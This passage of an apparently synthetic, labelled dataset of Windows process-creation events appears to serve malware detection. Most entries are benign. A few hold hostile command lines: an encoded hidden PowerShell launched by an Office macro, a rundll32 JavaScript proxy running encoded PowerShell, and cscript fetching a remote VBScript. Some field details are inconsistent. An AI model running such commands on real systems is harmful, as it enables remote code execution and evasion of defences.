    "Image": "C:\\Windows\\System32\\taskeng.exe",
    "CommandLine": "taskeng.exe {GUID} S",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 51527,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T15:37:15.206Z",
    "ProcessGuid": "{51D02E50-6D05-4E8C-BBAD-2FADEAD15006}",
    "ProcessId": 20322,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i http://deploy.corp.local/package32.msi /quiet /norestart",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 38318,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-03T03:03:15.429Z",
    "ProcessGuid": "{5A60080A-9305-45B2-9938-1631760BD64D}",
    "ProcessId": 42874,
    "Image": "C:\\Windows\\System32\\spoolsv.exe",
    "CommandLine": "C:\\Windows\\System32\\spoolsv.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 53028,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T14:29:43.529Z",
    "ProcessGuid": "{5F62A831-C04C-4F9C-859C-F790FCAEE1C8}",
    "ProcessId": 23578,
    "Image": "C:\\Windows\\System32\\lsass.exe",
    "CommandLine": "C:\\Windows\\System32\\lsass.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 9410,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T23:52:41.834Z",
    "ProcessGuid": "{3246B0CE-9C6A-4F81-9557-E8EF86CFAFE1}",
    "ProcessId": 10679,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k DcomLaunch -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 16484,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T12:05:15.121Z",
    "ProcessGuid": "{3CA5132C-0025-4C86-8606-5212D1C82EE9}",
    "ProcessId": 37573,
    "Image": "C:\\Program Files\\Microsoft\\Teams\\current\\Teams.exe",
    "CommandLine": "Teams.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 51098,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T11:32:51.767Z",
    "ProcessGuid": "{F5B91AF7-7D31-46B9-A905-7B2BAF8BE2E0}",
    "ProcessId": 45525,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 11484,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-06T02:44:14.314Z",
    "ProcessGuid": "{69CE52A6-CDBE-4A03-8E8B-D9C479039E02}",
    "ProcessId": 9214,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c powershell.exe -nop -w hidden -enc QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" /n document91.docm",
    "ParentProcessId": 14752,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1204.002",
    "technique_name": "Office Macro Execution",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-05T17:59:43.926Z",
    "ProcessGuid": "{64FA2CFC-4953-4637-817C-3F8B83474687}",
    "ProcessId": 54522,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i http://deploy.corp.local/package32.msi /quiet /norestart",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 57861,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-01T21:05:17.453Z",
    "ProcessGuid": "{BE1F1201-95E6-4934-B6A6-6A3347924A71}",
    "ProcessId": 44380,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k NetworkService",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 28788,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T13:25:29.790Z",
    "ProcessGuid": "{56390C3E-952D-4A4E-9616-B474906E4085}",
    "ProcessId": 45535,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-Content C:\\Scripts\\inventory.ps1 | Out-File C:\\Reports\\output.txt\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 39573,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T17:53:31.157Z",
    "ProcessGuid": "{F01CDA28-BE6E-4D25-B560-6F42F04B9210}",
    "ProcessId": 4572,
    "Image": "C:\\Windows\\System32\\UsoClient.exe",
    "CommandLine": "UsoClient.exe StartInteractiveScan",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 24647,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T09:49:57.461Z",
    "ProcessGuid": "{EE9BE229-2BC8-4DE6-A222-B9ED1294B559}",
    "ProcessId": 30975,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i C:\\Temp\\update_7.0.81.msi /passive /norestart",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 44152,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T10:55:40.323Z",
    "ProcessGuid": "{7E516020-A97B-419B-95B3-2445A279C4BE}",
    "ProcessId": 10893,
    "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
    "CommandLine": "\"C:\\Program Files\\Windows Defender\\MsMpEng.exe\"",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 29820,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T11:48:31.237Z",
    "ProcessGuid": "{F336AABB-6D13-4C7C-A7FE-4F0F02D6F882}",
    "ProcessId": 5119,
    "Image": "C:\\Windows\\System32\\resmon.exe",
    "CommandLine": "resmon.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 18324,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T00:20:59.101Z",
    "ProcessGuid": "{0711AE00-7CE3-44B9-A398-71632148AB6E}",
    "ProcessId": 55996,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k LocalService -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 47838,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T15:40:42.714Z",
    "ProcessGuid": "{62DB4EA6-AE03-42AD-AFEC-F33C9CB51289}",
    "ProcessId": 24476,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-ChildItem -Path C:\\Logs -Recurse -Filter *.log\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 56712,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T22:03:10.450Z",
    "ProcessGuid": "{75173E33-11A2-4350-93C1-961D0024CA9A}",
    "ProcessId": 28238,
    "Image": "C:\\Windows\\System32\\spoolsv.exe",
    "CommandLine": "C:\\Windows\\System32\\spoolsv.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 32735,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T12:54:32.921Z",
    "ProcessGuid": "{3C7AB413-9B55-4684-B087-90D56D1D38FB}",
    "ProcessId": 45518,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 54423,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T15:09:21.763Z",
    "ProcessGuid": "{3F6009F5-EC47-4680-B177-154CAF6DAF83}",
    "ProcessId": 6099,
    "Image": "C:\\Windows\\SoftwareDistribution\\Download\\Install\\update.exe",
    "CommandLine": "update.exe /quiet /norestart",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 16597,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T10:55:13.533Z",
    "ProcessGuid": "{50A1A84F-1FD3-41DF-B314-ACC3165661D0}",
    "ProcessId": 63397,
    "Image": "C:\\Windows\\System32\\rundll32.exe",
    "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=\")",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "explorer.exe",
    "ParentProcessId": 42109,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1218.011",
    "technique_name": "Rundll32 JavaScript",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-03T13:52:08.125Z",
    "ProcessGuid": "{3676B086-8E78-46B5-AF4C-D7D91FEA0E98}",
    "ProcessId": 56613,
    "Image": "C:\\Windows\\System32\\rundll32.exe",
    "CommandLine": "rundll32.exe shell32.dll,Control_RunDLL intl.cpl,,0",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 14231,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-03T13:22:40.309Z",
    "ProcessGuid": "{C1436F77-5449-406A-8DA6-307046DFF882}",
    "ProcessId": 16479,
    "Image": "C:\\Program Files\\Git\\bin\\git.exe",
    "CommandLine": "git.exe pull origin main",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 65110,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T10:23:30.732Z",
    "ProcessGuid": "{D8F3F73B-74FB-42B1-B877-1ED83CBC5E97}",
    "ProcessId": 25100,
    "Image": "C:\\Windows\\System32\\cscript.exe",
    "CommandLine": "cscript.exe //e:vbscript http://beacon-drop6149.net/script434.vbs",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 54829,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1059.005",
    "technique_name": "WScript Remote Script",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-01T15:08:32.425Z",
    "ProcessGuid": "{3BFF5F5D-FA08-4361-81BF-E5FEA394179D}",
    "ProcessId": 30936,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c net view \\\\fileserver",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 37956,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T12:50:28.034Z",
    "ProcessGuid": "{702B031B-9680-4801-A81A-49036CD2347E}",
    "ProcessId": 38982,
    "Image": "C:\\Program Files\\7-Zip\\7zFM.exe",
    "CommandLine": "7zFM.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 24911,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T14:07:34.230Z",
    "ProcessGuid": "{02C3774D-3AD2-4184-9937-3F2D1391783B}",
    "ProcessId": 43443,
    "Image": "C:\\Program Files\\7-Zip\\7zFM.exe",
    "CommandLine": "7zFM.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 10764,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T12:15:16.674Z",
    "ProcessGuid": "{74453C59-040C-4388-B66B-9A7C43165704}",
    "ProcessId": 11101,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-Service | Where-Object {$_.Status -eq 'Running'}\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 47873,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T00:20:10.820Z",
    "ProcessGuid": "{8449344F-460D-4A6E-BC73-F08A2FEA42EF}",
    "ProcessId": 63102,
    "Image": "C:\\Windows\\System32\\spoolsv.exe",
    "CommandLine": "C:\\Windows\\System32\\spoolsv.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 41509,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T02:27:54.108Z",
    "ProcessGuid": "{54AD491B-5D1E-4B9B-A61F-93CBC17B81F1}",
    "ProcessId": 16945,
    "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "CommandLine": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 29552,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T12:46:26.619Z",
    "ProcessGuid": "{80C5E910-8C48-4F6B-AF8A-12D56B95F566}",
    "ProcessId": 43307,
    "Image": "C:\\Users\\admin\\Downloads\\setup.exe",
    "CommandLine": "setup.exe /S /v/qn",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 6851,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T09:25:42.097Z",
    "ProcessGuid": "{64B6707B-16E1-4FB7-82BF-E80E415D918D}",
    "ProcessId": 13109,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c arp -a",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 65335,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T13:00:52.286Z",
    "ProcessGuid": "{D85A933A-EC47-49A5-84CF-D5703438C602}",
    "ProcessId": 59996,
    "Image": "C:\\Windows\\System32\\regsvr32.exe",
    "CommandLine": "regsvr32.exe /s C:\\Windows\\System32\\msxml6.dll",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 35589,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-04T01:25:32.382Z",
    "ProcessGuid": "{A763A295-C4B4-4A7B-8153-9039901D7C3F}",
    "ProcessId": 16451,
    "Image": "C:\\Windows\\System32\\lsass.exe",
    "CommandLine": "C:\\Windows\\System32\\lsass.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 26307,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T12:29:54.120Z",
    "ProcessGuid": "{6C139CC6-E167-4334-AE4F-DFDBB657B47E}",
    "ProcessId": 31837,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i C:\\Temp\\update_6.5.33.msi /passive /norestart",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 4517,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T15:20:22.223Z",
    "ProcessGuid": "{B2772214-4657-4485-9493-44527987C8AA}",
    "ProcessId": 59609,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe C:\\Users\\dbadmin\\Documents\\report.pdf",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\"",
    "ParentProcessId": 38598,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T12:54:49.988Z",
    "ProcessGuid": "{501BAACE-96EA-48CB-BB91-C74040B86297}",
    "ProcessId": 38190,
    "Image": "C:\\Windows\\System32\\wuauclt.exe",
    "CommandLine": "wuauclt.exe /detectnow /updatenow",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 3122,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T11:40:43.943Z",
    "ProcessGuid": "{90F97102-0337-4A8F-A896-3F8C46617C30}",
    "ProcessId": 19833,
    "Image": "C:\\Program Files\\Microsoft VS Code\\Code.exe",
    "CommandLine": "Code.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 15908,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
